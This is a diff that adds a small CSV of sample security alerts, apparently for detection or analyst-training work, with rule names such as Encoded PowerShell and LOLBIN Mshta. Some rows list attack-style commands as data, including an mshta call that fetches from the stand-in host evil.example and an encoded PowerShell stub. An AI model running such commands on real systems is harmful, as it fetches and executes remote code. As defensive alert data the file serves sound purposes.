@@ -1,0 +1,6 @@
+timestamp,alert_id,user,host,process,parent_process,command,severity,rule_name
+2025-12-17 01:15:22,ALRT-001,ergin,WIN-01,powershell.exe,explorer.exe,powershell.exe,Low,Interactive PowerShell
+2025-12-17 01:18:40,ALRT-002,ergin,WIN-01,cmd.exe,powershell.exe,cmd.exe /c whoami,Medium,Shell Chaining
+2025-12-17 01:25:10,ALRT-003,admin,WIN-02,powershell.exe,explorer.exe,powershell.exe -EncodedCommand SQBFAFgA,High,Encoded PowerShell
+2025-12-17 01:40:55,ALRT-004,user1,WIN-03,mshta.exe,explorer.exe,mshta.exe http://evil.example,High,LOLBIN Mshta
+2025-12-17 01:55:30,ALRT-005,backup,WIN-04,powershell.exe,taskeng.exe,powershell.exe -File backup.ps1,Low,Scheduled Task Script
